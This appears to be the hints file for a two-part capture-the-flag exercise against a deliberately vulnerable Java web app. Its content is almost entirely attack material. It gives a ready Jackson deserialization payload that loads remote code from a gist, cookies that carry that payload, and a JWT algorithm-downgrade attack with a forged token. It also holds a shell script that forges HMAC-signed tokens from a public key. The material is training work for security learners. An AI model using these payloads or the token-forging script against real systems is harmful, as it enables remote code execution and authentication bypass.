**Note: 10.128.76.174 is randomized: replace by any relevant IP**

# hints challenge 1
TL;DR
```
docker run -d --rm -p 8080:8080 -p 8090-8100:8090-8100 adioss/sensitive-webapp:latest
see com.adioss.hack.controller.IndexController.main for demo

Shortcuts:
http://10.128.76.174:8080/poweredBy
Top8-Insecure Deserialization, Top9-Using Components with Known Vulnerabilities 
{"index":123, "content": "123", "gifUrl": ["org.springframework.context.support.FileSystemXmlApplicationContext", "https://gist.githubusercontent.com/adioss/3d0e92ea5eadc6f6be9c3799ad2e5bdf/raw/ef255d1fc61d24773100826bd13f2282aa34f5e8/jackson-rce-via-spel-and-python"]}
Cookie: musicOnHold=eyJpbmRleCI6MTIzLCAiY29udGVudCI6ICIxMjMiLCAiZ2lmVXJsIjogWyJvcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5GaWxlU3lzdGVtWG1sQXBwbGljYXRpb25Db250ZXh0IiwgImh0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vYWRpb3NzLzNkMGU5MmVhNWVhZGM2ZjZiZTljMzc5OWFkMmU1YmRmL3Jhdy9lZjI1NWQxZmM2MWQyNDc3MzEwMDgyNmJkMTNmMjI4MmFhMzRmNWU4L2phY2tzb24tcmNlLXZpYS1zcGVsLWFuZC1weXRob24iXX0=
```

1. no need to use nmap or other surface attack tools: target is http://10.128.76.174:8080/ and you should focus only on this port
2. in the html source of the login page, did you find a link to another page? It leaks some useful information when you're a hacker
3. the OWASP top 10 references 2 security threats that we will exploit
4. did you see the cookie named 'musicOnHold'? nothing special in it? I decoded it and the content is special
5. did you notice gifUrl? we see that: "java.net.URL". It's java object type no? what if I try to put another value? 
6. maybe the app is sensitive to https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization? I've seen somewhere they are using Jackson...
7. I found that on internet: https://github.com/irsl/jackson-rce-via-spel. Maybe we can use org.springframework.context.support.FileSystemXmlApplicationContext?
8. I found that on internet: https://gist.github.com/adioss I think one gist smells good to do an exploit no? 
9. I've seen that python is available, no?
10. regarding java.lang.ProcessBuilder, I think we can use that to pass params as list: https://www.javatpoint.com/spring-tutorial-constructor-injection-with-collection
11. refresh the previous page, maybe you will, see jackson-rce-via-spel-and-python that can be used
12. did you find the login/password on /root? let's login using it and go to the next challenge!

# hints challenge 2

```
// default creds are: mouaaaaaaaa / wellllldone!!!!
docker run -d --rm -p 8080:8080 -e HACK_ACTIVATED=false -e DEFAULT_MICRO_SERVICE_URL=http://10.128.76.174:12345 adioss/sensitive-webapp:latest
// or you can set them:
docker run -d --rm -p 8080:8080 -e BYPASS_LOGIN="you" -e BYPASS_PASSWORD="rocks" -e HACK_ACTIVATED=false -e DEFAULT_MICRO_SERVICE_URL=http://10.128.76.174:12345 adioss/sensitive-webapp:latest
docker run -d --rm -p 12345:12345 -p 8090-8100:8090-8100 -e DEFAULT_WEBAPP_URL=http://10.128.76.174:8080 adioss/sensitive-microservice:latest
see com.adioss.hack.utils.JwtKeyManager.main for demo

Shortcuts:
http://10.128.76.174:8080/.well-known/jwks.json
http://10.128.76.174:8080/hackSignature
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIwOTA1N2NmOS00OGUwLTQ3MzYtODgxYy1jMzNhNDQ5OWUxYjQiLCJyb2xlIjoie1wiY29kZVwiOlwiQ09MTEVDVF9NRU1FXCIsXCJncmFudFwiOlwiUitXXCIsXCJzb3VyY2VcIjpbXCJqYXZhLm5ldC5VUkxcIixcImh0dHA6Ly8xNzIuMTcuMC4yXCJdfSIsImlzcyI6InNlbnNpdGl2ZS13ZWJhcHAifQ.d5Bgdqi3yJ0tDUHaZPBJBa8tyhJTCMopaJTKlBhr530csuAOnyjzL0_ApGNiwE4j7kidFtL_B4QgOGpOPb18WuZOYxkwvQ8Dwopcp4T24lbSGCEU95sU8cEPZR2ZrL6ewoYr31edB6bXDSWASAYTKdRekl9DiYDyWPPE5lyrzYDp8VcGpkvzcQCWHnw05B0dpNNoHC3DzEyETpkiYWSaKjZXzVcK8aNAxXhWyFseGzSjNhOi5M4LXCICLddGUojEoZz-bveRP2KNKBVNifMubHMKPnuu-n_wnhl5-W4EcN5SLbvnPwAZg4GVkmH123MhJcvz7TxdvjkJd3wVcCjV9Q
{"sub":"e9df66b2-a25c-485b-9153-90d257fbaed2","role":"{\"code\":\"COLLECT_MEME\",\"grant\":\"R+W\",\"source\":[\"org.springframework.context.support.FileSystemXmlApplicationContext\",\"https://gist.githubusercontent.com/adioss/3d0e92ea5eadc6f6be9c3799ad2e5bdf/raw/ef255d1fc61d24773100826bd13f2282aa34f5e8/jackson-rce-via-spel-and-python\"]}","iss":"sensitive-webapp"}
Cookie: session=ZXlKaGJHY2lPaUpJVXpJMU5pSjkuZXlKemRXSWlPaUpsT1dSbU5qWmlNaTFoTWpWakxUUTROV0l0T1RFMU15MDVNR1F5TlRkbVltRmxaRElpTENKeWIyeGxJam9pZTF3aVkyOWtaVndpT2x3aVEwOU1URVZEVkY5TlJVMUZYQ0lzWENKbmNtRnVkRndpT2x3aVVpdFhYQ0lzWENKemIzVnlZMlZjSWpwYlhDSnZjbWN1YzNCeWFXNW5abkpoYldWM2IzSnJMbU52Ym5SbGVIUXVjM1Z3Y0c5eWRDNUdhV3hsVTNsemRHVnRXRzFzUVhCd2JHbGpZWFJwYjI1RGIyNTBaWGgwWENJc1hDSm9kSFJ3Y3pvdkwyZHBjM1F1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwyRmthVzl6Y3k4elpEQmxPVEpsWVRWbFlXUmpObVkyWW1VNVl6TTNPVGxoWkRKbE5XSmtaaTl5WVhjdlpXWXlOVFZrTVdaak5qRmtNalEzTnpNeE1EQTRNalppWkRFelpqSXlPREpoWVRNMFpqVmxPQzlxWVdOcmMyOXVMWEpqWlMxMmFXRXRjM0JsYkMxaGJtUXRjSGwwYUc5dVhDSmRmU0lzSW1semN5STZJbk5sYm5OcGRHbDJaUzEzWldKaGNIQWlmUS5ET3M1TXUxdExRWEFPYjE5SmtiMVBad2RYaWg5QVEyaEVUNGtwS2JNZU5N
```
1. no need to use nmap or other surface attack tools: target is http://10.128.76.174:8080/ and you should focus only on this port
2. the challenge is also related to JWT. You need a base64 tool :-) (online: https://www.motobit.com/util/base64-decoder-encoder.asp)
3. apparently, there is a call to an external service. 
4. you may have found (in the cookie) the JWT used for auth. There are a lot of threats related to JWT: this page may contain interesting info https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/
5. did you see the algo used? RS256. Could it be possible to downgrade it to HS256?
6. did you find a standard page where we could find a public key to validate a JWT (aka jwks)?
7. here http://10.128.76.174:8080/.well-known/jwks.json. I find this page to extract a public key (pem) from a jwk:https://8gwifi.org/jwkconvertfunctions.jsp. Could we use it to extract the public key associated to the jwt?
8. here the public key(src/main/resources/config/public.key). I find this page that could help to forge jwt using a public key: http://10.128.76.174:8080/hackSignature. Can you forge your own token?
9. did you see that in the JWT there is an url? do you remember the first challenge? can we use the same kind of payload? https://gist.githubusercontent.com/adioss/3d0e92ea5eadc6f6be9c3799ad2e5bdf/raw/ef255d1fc61d24773100826bd13f2282aa34f5e8/jackson-rce-via-spel-and-python
10. did you find the flag?



# Notes
```
CONTENT='{"iss":"http://demo.sjoerdlangkemper.nl","iat":1588610437,"exp":1588610557,"data":{"hello":"adrien"}}'

HEADER="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"; \
BODY=`echo $CONTENT| base64 | tr -d '\n'`; \
PAYLOAD="$HEADER.$BODY"; \
PUBLICKEY=`cat public.key | xxd -p | tr -d "\\n"`; \
SIGNATURE=`echo -n "$PAYLOAD" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$PUBLICKEY |cut -d ' ' -f 2`; \
SIGNATURE_ENCODED=`python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('${SIGNATURE}')).replace('=','')\")"`; \
JWT="$PAYLOAD.$SIGNATURE_ENCODED"; \
echo $JWT;
```